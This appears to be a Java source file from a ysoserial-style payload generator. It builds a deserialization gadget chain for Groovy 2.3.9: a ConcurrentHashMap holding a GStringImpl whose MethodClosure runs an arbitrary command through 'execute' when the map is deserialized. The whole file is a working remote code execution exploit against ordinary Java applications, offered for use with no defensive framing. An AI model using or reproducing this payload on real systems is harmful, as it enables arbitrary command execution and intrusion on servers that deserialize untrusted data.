package jdk.payloadGroups;

import gadgetFragment.Entry2HashFragment;
import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;

import jdk.payloadGroups.annotation.Authors;
import jdk.payloadGroups.annotation.Dependencies;
import jdk.PayloadRunner;
import util.Reflections;

/* Gadget Chain: E.g.
java.util.concurrent.ConcurrentHashMap: void readObject
    groovy.lang.GString: int hashCode
    groovy.lang.GString: java.lang.String toString
    groovy.lang.GString: java.io.Writer writeTo
    groovy.lang.Closure: java.lang.Object call
    */


@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
public class GroovyGStr extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
        MethodClosure closure = new MethodClosure(command, "execute");
        Reflections.setFieldValue(closure, "maximumNumberOfParameters", 0);

        GStringImpl gString = Reflections.createWithoutConstructor(GStringImpl.class);
        Object[] values = new Object[3];
        values[0] = closure;
        String[] strings = new String[3];
        strings[0] = "xnaisxiuw";

        Reflections.setFieldValue(gString, "values", values);
        Reflections.setFieldValue(gString, "strings", strings);

        return Entry2HashFragment.makeConMap(gString,gString);
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(GroovyGStr.class, args);
	}
}
